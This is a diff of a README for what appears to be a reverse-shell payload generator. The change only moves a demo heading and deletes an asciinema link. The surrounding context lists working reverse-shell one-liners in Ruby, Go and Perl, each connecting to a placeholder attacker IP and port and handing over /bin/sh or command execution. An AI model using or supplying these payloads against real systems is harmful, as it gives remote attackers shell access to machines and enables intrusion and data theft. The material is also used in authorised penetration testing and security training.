@@ -43,6 +43,7 @@ example:<br>
 <br>
 when prompted:<br> 	
 y to create file or any other key to exit<br>
+# demo
 ## options
 ``` 
 -h 		display this page
@@ -77,10 +78,8 @@ RUBY
 -r		ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[ip]","[port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 -rw		ruby -rsocket -e 'c=TCPSocket.new("[ip]","[port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'	(windows only)
 
-
 GOLANG
 -g		echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","[ip]:[port]");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
-
 
 PERL
 -pe		perl -e 'use Socket;$i="[ip]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -129,5 +128,5 @@ LAZY OPTIONS
 		when prompted:	y to copy to clipboard (requires xsel)/any other key to continue
 		when prompted:	y to start web server in current directory/any other key to exit 
 ```
-# demo
-[![asciicast](https://asciinema.org/a/wLvMj4TdDoyWSY9I3pykriZkW.svg)](https://asciinema.org/a/wLvMj4TdDoyWSY9I3pykriZkW)
+
+
